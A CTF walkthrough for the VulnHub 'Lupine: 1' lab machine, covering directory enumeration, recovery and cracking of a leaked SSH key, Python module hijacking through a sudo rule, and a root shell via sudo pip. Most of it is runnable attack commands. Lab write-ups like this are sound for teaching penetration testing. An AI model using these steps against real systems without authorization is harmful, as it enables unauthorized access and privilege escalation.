# Lupine: 1 CTF – Summary Walkthrough

A full text-based breakdown of the Lupine vulnerable machine from VulnHub. This box showcases real-world issues like leaked SSH keys, Python module hijacking, and dangerous sudo permissions — all leading to privilege escalation.

## Discovery
- Ran `nmap -A -Pn <ip>` → Found ports:
  - 22 (SSH)
  - 80 (HTTP – Apache)

## Enumeration
- Ran `gobuster` on port 80:
  ```
  gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt
  ```
- Found `/robots.txt` → Revealed `/~myfiles/`
- Created a custom tilde wordlist:
  ```
  sed 's/^/~/g' /usr/share/wordlists/dirb/common.txt > tilde-list.txt
  ```
- Discovered `/~secret` → Contained:
  - Username: `icex64`
  - Hint: SSH key is hidden
  - Wordlist: Fasttrack

- Used dot-prefixed wordlist to find hidden files:
  ```
  cp /usr/share/wordlists/dirb/directory-list-2.3-small.txt dot-list.txt
  sed -i 's/^/./' dot-list.txt
  gobuster dir -u http://<ip>/~secret -w dot-list.txt
  ```
✅ Found: `/.mysecret.txt` → Contained encrypted Base58 string

- Decoded in CyberChef → Revealed **private SSH key**

## Foothold
- Saved decoded key to `ssh_key.rsa` → Set permissions:
  ```
  chmod 600 ssh_key.rsa
  ```
- Converted key and cracked with John the Ripper:
  ```
  ssh2john ssh_key.rsa > hash
  john --wordlist=/usr/share/wordlists/fasttrack.txt hash
  ```
- Logged into machine:
  ```
  ssh -i ssh_key.rsa icex64@<ip>
  ```

✅ Access as user `icex64` via SSH

## User Escalation (icex64 → arsene)
- Checked sudo privileges:
  ```
  sudo -l
  ```
  Output:
  ```
  (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
  ```
- `heist.py` imports: `webbrowser.py`

- Found `/usr/lib/python3.9/webbrowser.py`
- Injected shell payload:
  ```python
  import os
  os.system("/bin/bash")
  ```
- Ran the script:
  ```
  sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
  ```

✅ Switched to user `arsene`

## Privilege Escalation (arsene → root)
- Checked sudo again:
  ```
  sudo -l
  ```
  Output:
  ```
  (ALL : ALL) NOPASSWD: /usr/bin/pip
  ```
- Used GTFOBins pip exploit:
  ```
  TF=$(mktemp -d)
  sudo pip install --target=$TF ptyprocess
  sudo PYTHONPATH=$TF python3 -c 'import ptyprocess; ptyprocess.spawn("/bin/bash")'
  ```

✅ Gained root shell

---

**Full walkthrough with screenshots:**  
👉 [View the Medium post here](https://medium.com/@basitolasubomibalogun/lupine-vulnhub-ctf-walkthrough-ssh-key-leak-python-hijack-root-via-pip-gtfobins-dde7f2ec149c)
